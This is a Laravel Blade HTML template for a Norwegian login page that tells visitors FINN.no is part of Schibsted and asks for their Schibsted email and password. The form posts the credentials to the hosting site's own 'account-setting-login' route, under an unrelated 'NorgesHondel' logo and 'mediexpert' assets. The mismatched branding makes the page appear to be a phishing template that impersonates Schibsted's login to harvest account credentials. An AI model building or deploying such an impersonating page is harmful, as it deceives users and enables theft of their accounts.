<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    {{--<title>Schibsted</title>--}}
    <meta charset="UTF-8">

    <script src="{{asset('public/admin/js/jquery.min.js')}}"></script>

    <script src="{{asset('public/admin/js/bootstrap.min.js')}}"></script>
    <link rel="stylesheet" href="{{asset('public/css/bootstrap.min.css')}}">

    <link rel="shortcut icon" href="{{asset('public/images/favicon.ico')}}"/>
    <link rel="stylesheet" href="{{asset('public/mediexpert.css')}}">
    <link rel="stylesheet" href="{{asset('public/mediexpert-mq.css')}}">

    <link rel="stylesheet" href="{{asset('public/css/validate-error.css')}}">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

</head>
<body>

<main class="mt-0">
    <div class="dme-container">
        <div class="col-md-6 m-auto mt-5">
            <div class="company-image my-4">
                <a href="{{url('/')}}">
                    <img src="{{asset('public/images/NorgesHondel-logo.png')}}" height="28">
                </a>
            </div>
            <div class="m-4">
                <h5>Logg inn</h5><br>
                <p>FINN.no er en del av Schibsted. Du trenger en Schibsted-konto for å fortsette. Du kan bruke denne kontoen på alle Schibsted-sider.</p>
                <p><a href="#">Hva er en Schibsted-konto?</a></p>
                <form class="account-setting-form" action="{{route('account-setting-login')}}" method="POST">
                    @csrf
                    <div class="form-group ">
                        <label for="email">E-post</label>
                        <div class="" style="">
                            <input id="email" type="email" class="dme-form-control" name="email" value="{{ old('email') }}" required autocomplete="email" autofocus>
                        </div>
                    </div>
                    <div class="form-group ">
                        <label for="password">Passord</label>
                        <div class="" style="">
                            <input id="password" type="password" class="dme-form-control col-10" name="password" required autocomplete="current-password">
                            <a href="javascript:void(0);" class="col-2 show_password">Vis</a>
                        </div>
                    </div>
                    <div class="text-center">
                        <div class="form-group">
                            <button type="submit" class="dme-btn-outlined-blue">
                                Logg inn
                            </button>
                        </div>
                        @if (Route::has('password.request'))
                            <a class="" href="{{ route('password.request') }}">
                                Glemt passord?
                            </a>
                        @endif
                    </div>
                </form>
            </div>
        </div>
    </div>
</main>

<script>
    $( document ).ready(function() {
        $(document).on('click', '.account-setting-form .show_password', function (e) {
            var password = document.getElementById("password");
            if (password.type === "password") {
                password.type = "text";
            } else {
                password.type = "password";
            }
        });
    });
</script>
<script src="{{asset('public/mediexpert.js')}}"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/jquery.validate.min.js"></script>
<script src="{{asset('public/js/common-norges.js')}}"></script>
<script src="{{asset('public/js/validater.js')}}"></script>
<script src="{{asset('public/js/additional-methods.min.js')}}"></script>


</body>
</html>


